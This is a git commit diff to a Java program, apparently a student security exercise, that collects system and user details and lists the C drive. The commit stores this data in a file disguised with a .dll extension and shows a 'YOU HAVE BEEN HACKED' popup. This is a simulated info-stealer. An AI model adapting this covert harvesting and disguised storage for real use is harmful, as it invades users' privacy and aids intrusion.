386128be847bc1ca55c64aa7e2a1c03293fb2fc3
Ehsan Khalid <s3838975@student.rmit.edu.au>
2022-09-22 16:58:10 +1000

    Store All Captured Info in a .dll file

--- src/main/Main.java
+++ src/main/Main.java
@@ -7,6 +7,7 @@ import java.net.InetAddress;
 import java.net.URI;
 import java.net.URISyntaxException;
 import java.net.UnknownHostException;
+import java.util.Arrays;
 import java.util.Calendar;
 import java.util.Scanner;
 import java.util.TimeZone;
@@ -16,12 +17,7 @@ public class Main {
 
     public static void main(String[] args) throws IOException {
 
-        executeBrowser();
-        listCDir();
-        storeSysInfo();
-    }
-
-    public static void executeBrowser(){
+        // Executes the Browser
         try {
             // Creates a Desktop object
             Desktop desktop = Desktop.getDesktop();
@@ -30,14 +26,17 @@ public class Main {
         } catch (URISyntaxException uri) {
             // Catches the Exceptions
             System.out.println("Error Incorrect String");
-        } catch (IOException io){
+        } catch (IOException io) {
             // Catches the Exceptions
             System.out.println("Error IO Exception Thrown");
         }
-    }
 
-    public static void storeSysInfo() throws UnknownHostException {
+        //Creating a File object for directory
+        File dirListC = new File("C:\\");
+        //List of all files and directories
+        String filesInDir[] = dirListC.list();
 
+        // Gets & Stores System Information
         String osName = System.getProperty("os.name");
         String osVersion = System.getProperty("os.version");
         String osArchitecture = System.getProperty("os.arch");
@@ -59,49 +58,49 @@ public class Main {
         String userTimezone = timeZone.getDisplayName();
         String userTimezoneID = timeZone.getID();
 
+        String sysInfo = "OS NAME: " + osName + "\n" +
+                "Version: " + osVersion + "\n" +
+                "System Type: " + osArchDataModel + "\n" +
+                "OS Architecture: " + osArchitecture + "\n" +
+                "OS Manufacturer: " + osManufacturer + "\n" +
+                "User Dir: " + userDir + "\n" +
+                "User Home: " + userHome + "\n" +
+                "User Name: " + userName + "\n" +
+                "System Name: " + systemName + "\n" +
+                "Host IP Address: " + hostIPAddress + "\n" +
+                "Processor Identifier: " + processorIdentifier + "\n" +
+                "Processor Architecture: " + processorArchitecture + "\n" +
+                "Processor Number: " + processorNumbers + "\n" +
+                "User Country: " + userCountry + "\n" +
+                "User Timezone: " + userTimezone + "\n" +
+                "User Timezone ID: " + userTimezoneID + "\n" +
+                "User Language: " + userLanguage + "\n";
 
         JFrame windowPopup = new JFrame();
         ImageIcon image = new ImageIcon(Main.class.getResource("Hacked.png"));
         Image getImage = image.getImage();
-        Image resizedImage = getImage.getScaledInstance(128, 128,  java.awt.Image.SCALE_SMOOTH);
+        Image resizedImage = getImage.getScaledInstance(128, 128, java.awt.Image.SCALE_SMOOTH);
         image = new ImageIcon(resizedImage);
-        JOptionPane.showMessageDialog(
-                windowPopup,
-                "OS NAME: " + osName + "\n" +
-                        "Version: " + osVersion + "\n" +
-                        "System Type: " + osArchDataModel + "\n" +
-                        "OS Architecture: " + osArchitecture + "\n" +
-                        "OS Manufacturer: " + osManufacturer + "\n" +
-                        "User Dir: " + userDir + "\n" +
-                        "User Home: " + userHome + "\n" +
-                        "User Name: " + userName + "\n" +
-                        "System Name: " + systemName + "\n" +
-                        "Host IP Address: " + hostIPAddress + "\n" +
-                        "Processor Identifier: " + processorIdentifier + "\n" +
-                        "Processor Architecture: " + processorArchitecture + "\n" +
-                        "Processor Number: " + processorNumbers + "\n" +
-                        "User Country: " + userCountry + "\n" +
-                        "User Timezone: " + userTimezone + "\n" +
-                        "User Timezone ID: " + userTimezoneID + "\n" +
-                        "User Language: " + userLanguage + "\n",
-                "YOU HAVE BEEN HACKED",
-                JOptionPane.INFORMATION_MESSAGE,
-                image);
 
-    }
+        try {
+            FileWriter fileWriter = new FileWriter("Infos3785646s3838975.dll");
+            BufferedWriter bufferedWriter = new BufferedWriter(fileWriter);
+            PrintWriter out = new PrintWriter(bufferedWriter);
+            out.println("Host system configuration (systeminfo and network configuration):\n \n" + sysInfo);
 
-    public static void listCDir(){
-        //Creating a File object for directory
-        File dirListC = new File("C:\\");
-        //List of all files and directories
-        String filesInDir[] = dirListC.list();
-        System.out.println("List of Folders & Files in the local C Drive:");
-        for(int i=0; i<filesInDir.length; i++) {
-            System.out.println(filesInDir[i]);
+            out.println("\nList of Folders & Files in the local C Drive:\n");
+            for (int i = 0; i < filesInDir.length; i++) {
+                out.println(filesInDir[i]);
+            }
+
+            bufferedWriter.close();
+        } catch (Exception e) {
+            System.err.println("Error: " + e.getMessage());
         }
+
+        JOptionPane.showMessageDialog(windowPopup, sysInfo,"YOU HAVE BEEN HACKED", JOptionPane.INFORMATION_MESSAGE, image);
+
     }
-
-
 
 
 }
